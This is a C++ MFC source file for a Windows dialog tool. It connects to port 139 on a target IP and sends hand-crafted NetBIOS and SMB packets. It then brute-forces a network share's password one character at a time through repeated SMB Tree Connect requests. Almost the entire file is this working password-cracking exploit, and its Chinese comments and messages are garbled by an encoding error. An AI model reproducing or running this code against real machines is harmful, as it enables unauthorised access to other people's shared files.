// 666Dlg.cpp : implementation file
//

#include "stdafx.h"
#include "666.h"
#include "666Dlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CMy666Dlg dialog

CMy666Dlg::CMy666Dlg(CWnd* pParent /*=NULL*/)
	: CDialog(CMy666Dlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CMy666Dlg)
	m_Password = _T("");
	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CMy666Dlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CMy666Dlg)
	DDX_Text(pDX, IDC_PASSWORD, m_Password);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CMy666Dlg, CDialog)
	//{{AFX_MSG_MAP(CMy666Dlg)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_CONNECT, OnConnect)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CMy666Dlg message handlers

BOOL CMy666Dlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	// TODO: Add extra initialization here
	if(!IniSock())
		return FALSE;	
	return TRUE;  // return TRUE  unless you set the focus to a control
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CMy666Dlg::OnPaint() 
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CMy666Dlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}

BOOL CMy666Dlg::IniSock()
{
	WORD wVersionrequested;
	WSADATA wsaData;

	wVersionrequested = MAKEWORD(2,0);
	
	//Start Sock
	int err = WSAStartup(wVersionrequested,&wsaData);
	if (err == -1)
	{
			MessageBox("WSAStartup err",
				 "error",MB_OK);
			return FALSE;
	}
	return TRUE;
}

BOOL CMy666Dlg::ConnectSock()
{
	int msgsock;

	//Ini Sock
	ServerSock = socket(AF_INET,SOCK_STREAM,0);
	if (ServerSock < 0)
	{
			MessageBox("scoker err",
				 "err",MB_OK);
			return FALSE;
	}

	//Connect
	CString server_address;
	GetDlgItem(IDC_IP)->GetWindowText(server_address);
	server.sin_family = PF_INET;
	server.sin_port = htons(139);
	server.sin_addr.s_addr  = inet_addr(server_address);

	msgsock = connect(ServerSock,(struct sockaddr*)&server,sizeof(server));
	if (msgsock!=0)
	{
		return FALSE;
	}
	return TRUE;
}

void CMy666Dlg::OnConnect() 
{
	GetDlgItem(IDC_PASSWORD)->SetWindowText("");

	if(!ConnectSock())
		return;
//	FindShare();
//	MessageBox("ok");
	if(MachineName()==FALSE)
	{
		closesocket(ServerSock);
		MessageBox("��������������ͨѶ,\n���������������Ƿ���ȷ������ԭ��","ע��",MB_OK|MB_ICONSTOP);
		return;
	}
	if(LinkSecond()==FALSE)
	{
		closesocket(ServerSock);
		return;
	}
//��ʼ������
	PassFormat();
	CString pass=" ";
	SendPassword(pass);
//��ʼ�ƽ�
	closesocket(ServerSock);
	
}


//���������ӵĻ��������͸�139�˿�.
BOOL CMy666Dlg::MachineName()
{
	CString Computer;
	GetDlgItem(IDC_COMPUTER)->GetWindowText(Computer);
	if(Computer.IsEmpty())
	{
		MessageBox("������������!","ע��",MB_OK+MB_ICONSTOP);
		return FALSE;
	}
	if(Computer.GetLength()>15)
	{
		MessageBox("��������������16λ","ע��",MB_OK+MB_ICONSTOP);
		return FALSE;
	}
	char bb[72]="   D CACACACACACACACACACACACACACACACA  CACACACACACACACACACACACACACACACA";
	bb[0]=0x81;
	bb[1]=0x00;
	bb[2]=0x00;
    bb[37]=0x00;
	int bblen1=5;
	int bblen2=39;
	Computer.MakeUpper();
	for(int i=0;i<Computer.GetLength();i++)
	{
		//0---9==DA---DJ
		if(Computer.GetAt(i)>='0'&&Computer.GetAt(i)<='9')
		{
			bb[bblen1]='D';
			bb[bblen2]='D';
			bblen1++;
			bblen2++;
			bb[bblen1]=0x41-0x30+Computer.GetAt(i);
			bb[bblen2]=0x41-0x30+Computer.GetAt(i);
			bblen1++;
			bblen2++;
		}
		//A----O==EB---EP
		//P----Z==FA---FK
		else if(Computer.GetAt(i)>='A'&&Computer.GetAt(i)<='O')
		{
			bb[bblen1]='E';
			bb[bblen2]='E';
			bblen1++;
			bblen2++;
			bb[bblen1]=Computer.GetAt(i)+1;
			bb[bblen2]=Computer.GetAt(i)+1;
			bblen1++;
			bblen2++;
		}
		else if(Computer.GetAt(i)>='P'&&Computer.GetAt(i)<='Z')
		{
			bb[bblen1]='F';
			bb[bblen2]='F';
			bblen1++;
			bblen2++;
			bb[bblen1]=Computer.GetAt(i)-'P'+'A';
			bb[bblen2]=Computer.GetAt(i)-'P'+'A';
			bblen1++;
			bblen2++;
		}
		else
		{
			MessageBox("��������ֻ֧�ּ������Ϊ0-9��A-B","ע��",MB_OK|MB_ICONSTOP);
			return FALSE;
		}
	}
	send(ServerSock,bb,sizeof(bb),0);
	char first[4];
	memset(first,0,4);
	recv(ServerSock,first,sizeof(buf),0);
    char d1=0x82;
	if(first[0]==d1)
		return TRUE;
	else
		return FALSE;
}

BOOL CMy666Dlg::LinkSecond()
{
//��������139�˿��еĵڶ���,��һ��������ַ�����֪���庬��
    char cc[114]="   n SMBr      S                     K  PC NETWORJ PROGRAM 1.0  LANMAN1.0  Windows for Workgroupu 3.1a  LM1.2X002";
	int i=0;
	for(i=0;i<3;i++)
		cc[i]=0x00;
	cc[4]=0xff;
	for(i=9;i<13;i++)
	    cc[i]=0x00;
	cc[13]=24;
	cc[14]=8;
	for(i=16;i<30;i++)
		cc[i]=0x00;
	cc[30]=14;
	cc[31]=0xff;
	for(i=32;i<37;i++)
		cc[i]=0;
	cc[38]=0;
	cc[39]=2;
	cc[62]=0;
	cc[63]=2;
	cc[73]=0;
	cc[74]=2;
	cc[103]=2;
	cc[102]=0;
	send(ServerSock,cc,sizeof(cc),0);
	memset(buf,0,1000);
	int len=recv(ServerSock,buf,sizeof(buf),0);
	if(len>0)
		return TRUE;
	else 
		return FALSE;
}

void CMy666Dlg::SendPassword(CString pass)
{
//43=���볤�� 45=����+URL������ 3=passformat�ܳ���-4 47=����+URL
//����+URLǰΪ47���ַ�
	//���� 1\\hjm\c\ a: 7�������е�\\+\+ +a:��Ϊ�߸��ַ�
	CString computer,share;
	GetDlgItem(IDC_COMPUTER)->GetWindowText(computer);
	GetDlgItem(IDC_SHARE)->GetWindowText(share);
	computer.MakeUpper();
	share.MakeUpper();
	int passlen=pass.GetLength()+7+computer.GetLength()+share.GetLength()-4+47;
    passformat[3]=passlen;
    passformat[43]=pass.GetLength();
	passformat[45]=pass.GetLength()+computer.GetLength()+share.GetLength()+7;
	int where=47;
	for(int i=1;i<pass.GetLength();i++)
	{
		passformat[where]=pass.GetAt(i-1);
		where++;
	}
	int current=where;
	passformat[where]=0x00;
	where++;
	passformat[where]='\\';
	where++;
	passformat[where]='\\';
	where++;
	for(i=0;i<computer.GetLength();i++)
	{
		passformat[where]=computer.GetAt(i);
		where++;
	}
	passformat[where]='\\';
	where++;
	for(i=0;i<share.GetLength();i++)
	{
		passformat[where]=share.GetAt(i);
		where++;
	}
	passformat[where]=0x00;
	where++;
	passformat[where]='A';
	where++;
	passformat[where]=':';
	send(ServerSock,passformat,passlen+4,0);
	memset(buf,0,1000);
	int len=recv(ServerSock,buf,sizeof(buf),0);
	if(len>39)
	{
//		MessageBox(pass);
		GetDlgItem(IDC_PASSWORD)->SetWindowText(pass);
		return;
	}
	pass.Delete(pass.GetLength()-1,1);
	char pp='A';
	for(int v=0;v<26;v++)
	{
		passformat[current]=pp;
		send(ServerSock,passformat,passlen+4,0);
		memset(buf,0,1000);
		int len=recv(ServerSock,buf,sizeof(buf),0);
		if(len>39)
		{
			CString mypass;
			if(pass.GetLength()==0)
			{
				mypass=pp;
				mypass=mypass+" ";
				SendPassword(mypass);		
				return;
			}
			else
			{
				
				mypass=pass+pp+" ";
				SendPassword(mypass);
				return;
			}
		}
		pp++;
	}

}

void CMy666Dlg::PassFormat()
{
	memset(passformat,0,200);
	passformat[4]=0xff;
	passformat[5]=0x53;
	passformat[6]=0x4d;
	passformat[7]=0x42;
	passformat[8]=0x75;
	passformat[13]=24;
	passformat[15]=8;
	passformat[30]=14;
	passformat[31]=15;
	passformat[36]=4;
	passformat[37]=0xff;
	return;

}
